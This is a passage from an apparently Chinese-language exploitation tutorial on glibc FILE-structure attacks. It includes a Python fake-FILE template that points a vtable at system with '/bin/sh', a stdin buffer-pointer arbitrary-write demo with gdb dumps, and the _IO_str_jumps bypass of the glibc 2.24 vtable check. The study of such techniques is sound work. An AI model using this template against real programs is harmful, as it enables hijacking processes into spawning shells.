class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//通过exit调用_IO_flush_all_lockp去调用_IO_overflow，从而执行了0x41414141</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里给出一个模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">vtable_addr=fake_file_addr+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br>fakefile=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(_IO_list_all-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">3</span>)+p64(<span class="hljs-number">4</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(vtable_addr)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(system_addr)<br></code></pre></td></tr></table></figure><p>需要知道fakefile的地址</p><h1 id="2-24下的利用"><a href="#2-24下的利用" class="headerlink" title="2.24下的利用"></a>2.24下的利用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在2.24版本中会对 vtable 合法性进行检查（调用虚函数前）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if unknown vtable pointers are permitted; otherwise,</span><br><span class="hljs-comment">   terminate the process.  */</span><br><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">   the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先检查 vtable 是否位于 IO_vtable 段中，如果满足就正常执行，不满足执行_IO_vtable_check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-comment">/* Honor the compatibility flag.  */</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* In case this libc copy is in a non-default namespace, we always</span><br><span class="hljs-comment">     need to accept foreign vtables because there is always a</span><br><span class="hljs-comment">     possibility that FILE * objects are passed across the linking</span><br><span class="hljs-comment">     boundary.  */</span><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  <span class="hljs-comment">/* We cannot perform vtable validation in the static dlopen case</span><br><span class="hljs-comment">     because FILE * handles might be passed back and forth across the</span><br><span class="hljs-comment">     boundary.  Therefore, we disable checking in this case.  */</span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果是非法的就引发 abort</p><h2 id="新技术"><a href="#新技术" class="headerlink" title="新技术"></a>新技术</h2><h3 id="利用缓冲区的任意地址写"><a href="#利用缓冲区的任意地址写" class="headerlink" title="利用缓冲区的任意地址写"></a>利用缓冲区的任意地址写</h3><p>当 vtable 难以利用时，关注点来到 _IO_FILE 结构内部的域中， 里面是一些在使用标准 IO 库会创建并维护的相关信息，其中有些是 fwrite fread 等函数写入地址或读取地址的，控制这些就可以实现任意地址写&#x2F;读</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br>  <span class="hljs-type">int</span> _flags2;<br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>由于进程默认存在 stdin\stdout\stderr，所以不需要存在文件流</p><p> _IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址 ，要利用的就是这两个</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br> <span class="hljs-type">char</span> stack_buf[<span class="hljs-number">100</span>];<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,stack_buf);<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,stack_buf);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>第一次stdin前</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:    <span class="hljs-number">0</span>x00000000fbad2088  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">112</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>xffffffffffffffff<br><span class="hljs-attribute">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">128</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd3790<br><span class="hljs-attribute">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">144</span>&gt;:    <span class="hljs-number">0</span>xffffffffffffffff  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">160</span>&gt;:    <span class="hljs-number">0</span>x00007ffff7dd19c0  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">176</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">192</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">208</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd06e0 &lt;== vtable<br></code></pre></td></tr></table></figure><p>内容全是空的，未初始化</p><p>调用 scanf 后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:    <span class="hljs-number">0</span>x00000000fbad2288  <span class="hljs-number">0</span>x0000000000602013<br><span class="hljs-attribute">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000602014  <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000602010  <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000602010  <span class="hljs-number">0</span>x0000000000602010  起始地址<br><span class="hljs-attribute">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000602410 结束地址  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">112</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>xffffffffffffffff<br><span class="hljs-attribute">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">128</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd3790<br><span class="hljs-attribute">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">144</span>&gt;:    <span class="hljs-number">0</span>xffffffffffffffff  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">160</span>&gt;:    <span class="hljs-number">0</span>x00007ffff7dd19c0  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">176</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">192</span>&gt;:    <span class="hljs-number">0</span>x00000000ffffffff  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">208</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd06e0<br></code></pre></td></tr></table></figure><p>可以看到被初始化了</p><p>接着我们修改起始和结束地址为 stack</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:    <span class="hljs-number">0</span>x00000000fbad2288  <span class="hljs-number">0</span>x0000000000602013<br><span class="hljs-attribute">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000602014  <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000602010  <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000602010  <span class="hljs-number">0</span>x00007ffff7dd2740 &lt;== _IO_buf_base<br><span class="hljs-attribute">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x00007ffff7dd27c0  <span class="hljs-number">0</span>x0000000000000000 &lt;== _IO_buf_end<br><span class="hljs-attribute">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">112</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>xffffffffffffffff<br><span class="hljs-attribute">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">128</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd3790<br><span class="hljs-attribute">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">144</span>&gt;:    <span class="hljs-number">0</span>xffffffffffffffff  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">160</span>&gt;:    <span class="hljs-number">0</span>x00007ffff7dd19c0  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">176</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">192</span>&gt;:    <span class="hljs-number">0</span>x00000000ffffffff  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="hljs-number">208</span>&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd06e0<br></code></pre></td></tr></table></figure><p>然后读入的数据就会写到该位置去</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd2740</span> &lt;buf&gt;:   <span class="hljs-number">0</span>x00000a6161616161  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd2750</span> &lt;buffer&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd2760</span> &lt;buffer&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd2770</span> &lt;buffer&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd2780</span> &lt;buffer&gt;:    <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure><h3 id="IO-str-jumps-overflow"><a href="#IO-str-jumps-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h3><p>libc不只有 _IO_file_jumps，还有 _IO_str_jumps，该 vtable 不在 check 的范围内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>如果我们设置vtable为这个，就可以调用不一样的文件操作函数</p><p>这里以 <code>_IO_str_overflow</code>为例子： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_str_overflow (_IO_FILE *fp, <span class="hljs-type">int</span> c)<br>&#123;<br>  <span class="hljs-type">int</span> flush_only = c == EOF;<br>  _IO_size_t pos;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="hljs-comment">// pass</span><br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br>  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="hljs-comment">// should in </span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span> <span class="hljs-comment">// pass</span><br>    <span class="hljs-keyword">return</span> EOF;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">char</span> *new_buf;<br>      <span class="hljs-type">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>      <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>      _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br>      <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<span class="hljs-comment">//pass 一般会通过</span><br>        <span class="hljs-keyword">return</span> EOF;<br>      new_buf<br>        = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="hljs-comment">//target [fp+0xe0]</span><br>      <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-comment">/*      __ferror(fp) = 1; */</span><br>          <span class="hljs-keyword">return</span> EOF;<br>        &#125;<br>      <span class="hljs-keyword">if</span> (old_buf)<br>        &#123;<br>          <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);<br>          <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>          fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>      <span class="hljs-built_in">memset</span> (new_buf + old_blen, <span class="hljs-string">&#x27;\0&#x27;</span>, new_size - old_blen);<br><br>      _IO_setb (fp, new_buf, new_buf + new_size, <span class="hljs-number">1</span>);<br>      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);<br>      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);<br>      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);<br>      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - 